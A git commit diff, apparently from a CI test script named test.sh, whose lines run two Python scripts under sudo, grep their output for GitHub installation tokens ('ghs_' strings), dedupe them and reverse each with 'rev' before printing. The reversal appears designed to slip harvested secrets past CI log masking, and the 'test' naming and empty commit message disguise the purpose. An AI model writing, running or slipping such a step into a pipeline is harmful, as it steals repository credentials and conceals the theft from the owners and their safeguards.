62a14122f37ef014118ff37b93ef9924488bc6d1
Test <test@example.com>
2026-03-24 15:16:33 +0100

    ..

--- test.sh
+++ test.sh
@@ -1,5 +1,5 @@
 echo test
-sudo python3 test.py | tr -d '\\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | rev
-sudo python3 test2.py | tr -d '\\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | rev
+sudo python3 test.py | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | rev
+sudo python3 test2.py | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | rev
 sleep 60
 exit 0
